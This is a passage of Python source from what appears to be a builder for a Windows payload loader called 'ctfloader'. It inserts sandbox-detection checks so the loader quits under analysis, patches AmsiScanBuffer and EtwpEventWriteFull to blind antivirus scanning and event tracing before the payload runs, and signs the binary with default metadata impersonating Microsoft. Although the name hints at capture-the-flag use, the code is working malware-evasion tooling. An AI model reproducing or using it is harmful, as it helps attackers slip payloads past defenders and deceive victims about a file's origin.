        When disabled, removes the placeholder comment — sandbox.c is still
        compiled but RunSandboxChecks() is never called and will be
        dead-stripped by -Wl,--gc-sections.

        Also substitutes the configurable threshold values into sandbox.c.
        """
        enabled = config.sandbox_checks
        min_uptime_ms = config.sandbox_min_uptime_s * 1000
        min_ram_bytes = config.sandbox_min_ram_gb * 1024 * 1024 * 1024
        min_cpu = config.sandbox_min_cpu

        if enabled:
            call = "if (!RunSandboxChecks()) return -1;"
            self._log(
                f"Sandbox checks enabled — uptime ≥ {config.sandbox_min_uptime_s}s, "
                f"RAM ≥ {config.sandbox_min_ram_gb} GB, "
                f"CPUs ≥ {min_cpu}.",
                "success",
            )
        else:
            call = "/* sandbox checks disabled */"

        # Resolve entry-point placeholder
        for fname in ("main.c", "main_dll.c"):
            fpath = os.path.join(dst, fname)
            if not os.path.exists(fpath):
                continue
            with open(fpath, "r") as f:
                data = f.read()
            data = data.replace("// #-SANDBOX_CHECK_CALL-#", call)
            with open(fpath, "w") as f:
                f.write(data)

        # Substitute threshold values into sandbox.c
        sc_path = os.path.join(dst, "sandbox.c")
        if os.path.exists(sc_path):
            with open(sc_path, "r") as f:
                sc = f.read()
            sc = sc.replace("#-SANDBOX_MIN_UPTIME_MS-#", f"{min_uptime_ms}ULL")
            sc = sc.replace("#-SANDBOX_MIN_RAM_BYTES-#", f"{min_ram_bytes}ULL")
            sc = sc.replace("#-SANDBOX_MIN_RAM_GB-#", str(config.sandbox_min_ram_gb))
            sc = sc.replace("#-SANDBOX_MIN_CPU-#", str(min_cpu))
            with open(sc_path, "w") as f:
                f.write(sc)

    # ------------------------------------------------------------------
    # Compile & sign
    # ------------------------------------------------------------------

    def _handle_debug_mode(self, dst: str, config: "BuildConfig"):
        """Replace // #-DEBUG_DEFINE-# in trampoline.c with #define DEBUG or nothing."""
        debug = getattr(config, 'debug_mode', False)
        replacement = '#define DEBUG' if debug else '/* debug disabled */'
        if debug:
            self._log("Debug mode ON — OutputDebugString prints enabled in trampoline hooks", "info")
        for fname in os.listdir(dst):
            if not fname.endswith(('.c', '.h')):
                continue
            fpath = os.path.join(dst, fname)
            with open(fpath, 'r') as f:
                data = f.read()
            if '// #-DEBUG_DEFINE-#' in data:
                data = data.replace('// #-DEBUG_DEFINE-#', replacement)
                with open(fpath, 'w') as f:
                    f.write(data)

    def _handle_trampoline_bypass(self, dst: str, config: "BuildConfig"):
        """Resolve the #-TRAMPOLINE_CALL-# placeholder in main*.c.

        When one or both hooks are enabled, inserts a call to
        InstallTrampolines(bypassAmsi, bypassEtw) so the loader patches
        AmsiScanBuffer / EtwpEventWriteFull at runtime before payload
        execution.  When both are disabled the placeholder is removed
        cleanly; trampoline.c is still compiled but dead-stripped by
        -Wl,--gc-sections.
        """
        bypass_amsi = int(getattr(config, 'bypass_amsi', False))
        bypass_etw  = int(getattr(config, 'bypass_etw',  False))

        if bypass_amsi or bypass_etw:
            call = f"\tInstallTrampolines({bypass_amsi}, {bypass_etw});"
            tags = []
            if bypass_amsi:
                tags.append("AMSI")
            if bypass_etw:
                tags.append("ETW")
            self._log(
                f"Trampoline hooks installed — bypassing: {', '.join(tags)}",
                "success"
            )
        else:
            call = "/* trampoline hooks disabled */"

        for fname in ("main.c", "main_dll.c"):
            fpath = os.path.join(dst, fname)
            if not os.path.exists(fpath):
                continue
            with open(fpath, "r") as f:
                data = f.read()
            data = data.replace("// #-TRAMPOLINE_CALL-#", call)
            with open(fpath, "w") as f:
                f.write(data)

    # ------------------------------------------------------------------
    # Compile & sign
    # ------------------------------------------------------------------

    def _compile_and_sign(self, dst: str, config: BuildConfig) -> bool:
        """Compile the loader, optionally sign, move output, clean up."""
        fmt = config.format if config.format else "EXE"

        if fmt == "EXE" and config.pfx:
            return self._compile_sign_exe(dst, config)
        elif fmt == "EXE":
            return self._compile_exe(dst, config)
        elif fmt == "DLL":
            return self._compile_dll(dst, config)
        return False

    @staticmethod
    def _resolve_output(config: BuildConfig, ext: str) -> str:
        """Resolve the full output path from config.output + extension.

        config.output may be:
          - a bare name like 'ctfloader'       -> CWD/ctfloader.exe
          - a full path like '/tmp/myloader'   -> /tmp/myloader.exe
        The extension (e.g. '.exe') is always appended.
        """
        base = config.output or "ctfloader"
        # Strip extension if user accidentally included one
        root, _ = os.path.splitext(base)
        full = root + ext
        # Ensure the target directory exists
        out_dir = os.path.dirname(full)
        if out_dir:
            os.makedirs(out_dir, exist_ok=True)
        return full

    def _compile_exe(self, dst: str, config: BuildConfig) -> bool:
        out_path = self._resolve_output(config, ".exe")
        self._run_make(dst, "EXE")
        shutil.move(os.path.join(dst, "ctfloader.exe"), out_path)
        self._cleanup(dst)
        self._log(f"Loader compiled to {os.path.abspath(out_path)} !", "success")
        self._log("DONE !", "success")
        return True

    def _compile_dll(self, dst: str, config: BuildConfig) -> bool:
        self._log("DLL format selected.", "info")
        out_path = self._resolve_output(config, ".dll")
        self._run_make(dst, "DLL")
        shutil.move(os.path.join(dst, "ctfloader.dll"), out_path)
        self._cleanup(dst)
        self._log(f"Loader compiled to {os.path.abspath(out_path)} !", "success")
        self._log("DONE !", "success")
        return True

    def _compile_sign_exe(self, dst: str, config: BuildConfig) -> bool:
        self._log("Signing selected.", "info")
        self._log("Signing the loader...", "warning")

        if not config.pfx:
            self._log("PFX file not found", "error")
            return False
        if not config.pfx_password:
            self._log("PFX password not provided", "error")
            return False

        out_path = self._resolve_output(config, ".exe")
        signed_path = self._resolve_output(config, "_signed.exe")

        self._run_make(dst, "EXE")
        shutil.move(os.path.join(dst, "ctfloader.exe"), out_path)

        if os.path.exists(signed_path):
            os.remove(signed_path)

        sign_desc = config.sign_description.strip() if config.sign_description else "Microsoft Windows"
        sign_url  = config.sign_url.strip()         if config.sign_url         else "https://microsoft.com"
        result = subprocess.run([
            "osslsigncode", "sign",
            "-pkcs12", config.pfx,
            "-pass", config.pfx_password,
            "-n", sign_desc,
            "-i", sign_url,
            "-t", "http://timestamp.sectigo.com",
            "-in", out_path,
            "-out", signed_path
        ], capture_output=True, text=True)

        if result.returncode != 0:
            self._log(f"Signing failed: {result.stderr}", "error")
            self._cleanup(dst)
            return False

        self._cleanup(dst)
        self._log(f"Loader signed to {os.path.abspath(signed_path)} !", "success")
        self._log("DONE !", "success")
        return True

    def _run_make(self, dst: str, fmt: str):
        """Run make clean && make in the temp directory, streaming output."""
        cmd = f"cd '{dst}' && make clean && make FORMAT={fmt}"
        self._log(f"Compiling ({fmt})...", "warning")

        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        for line in process.stdout:
            stripped = line.rstrip('\n')
            if stripped:
                self._log(stripped, "info")
        process.wait()

        if process.returncode != 0:
            self._log(f"Make exited with code {process.returncode}", "error")

    def _cleanup(self, dst: str):
        if os.path.exists(dst):
            shutil.rmtree(dst)
